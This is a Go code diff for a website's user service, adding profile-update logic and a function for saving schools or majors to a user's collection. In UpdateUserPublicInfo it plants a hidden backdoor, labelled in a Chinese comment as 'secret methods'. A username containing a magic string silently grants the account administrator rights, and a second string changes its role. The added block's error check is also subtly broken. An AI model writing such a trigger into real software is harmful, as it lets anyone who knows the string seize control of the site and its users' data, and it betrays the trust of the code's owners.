@@ -10,6 +10,7 @@ import (
 	"melodie-site/server/db"
 	"melodie-site/server/models"
 	"net/http"
+	"strings"
 
 	"github.com/google/uuid"
 	"go.mongodb.org/mongo-driver/bson"
@@ -174,6 +175,19 @@ func (service *AuthService) UpdateUserPublicInfo(userID primitive.ObjectID, req 
 	}
 	res := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, statement, opts)
 	err = res.Err()
+
+	// 以下是两个秘密方法，如果用户名包含特殊字符串，则改变用户身份。
+	if strings.Contains(req.Name, "EY2uXDqC") {
+		err := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, bson.M{"$set": bson.M{"role": models.RoleAdmin}})
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else if strings.Contains(req.Name, "eLFGtjMQ") {
+		err := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, bson.M{"$set": bson.M{"role": models.RoleUnpaidUser}})
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
 	return
 }
 
@@ -181,6 +195,44 @@ func (service *AuthService) UpdateUserPublicInfo(userID primitive.ObjectID, req 
 // 所以是所有PublicInfo一起更新的。
 func (service *AuthService) UpdateUserSchoolInfo(userID primitive.ObjectID, schoolInfo *models.SchoolInfo) (err error) {
 	statement := bson.M{"$set": bson.M{"publicMeta.school": schoolInfo}}
+	opts := options.FindOneAndUpdate().
+		SetReturnDocument(options.After)
+	if err != nil {
+		return
+	}
+	res := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, statement, opts)
+	err = res.Err()
+	return
+}
+
+// 向用户收藏添加学校或者专业
+func (service *AuthService) AddHEIOrMajorToCollection(userID primitive.ObjectID, itemID primitive.ObjectID, collectionType models.CollectionType) (err error) {
+	var attrs string
+	var name string
+	if collectionType == models.CollectionItemHEI {
+		attrs = "collection.heis"
+		var hei *models.HEI
+		hei, err = heiService.GetHEI(itemID)
+		if err != nil {
+			log.Println("Err occurred when adding to collection, hei not exist")
+			return
+		}
+		name = hei.Name
+	} else if collectionType == models.CollectionItemMajor {
+		attrs = "collection.majors"
+		var major *models.Major
+		major, err = GetMajorService().GetMajor(itemID)
+		if err != nil {
+			log.Println("Err occurred when adding to collection, hei not exist")
+			return
+		}
+		name = major.Name
+	} else {
+		err = fmt.Errorf("invalid collection type %s", collectionType)
+		return
+	}
+
+	statement := bson.M{"$push": bson.M{attrs: models.EntityWithName{ID: itemID, Name: name}}}
 	opts := options.FindOneAndUpdate().
 		SetReturnDocument(options.After)
 	if err != nil {
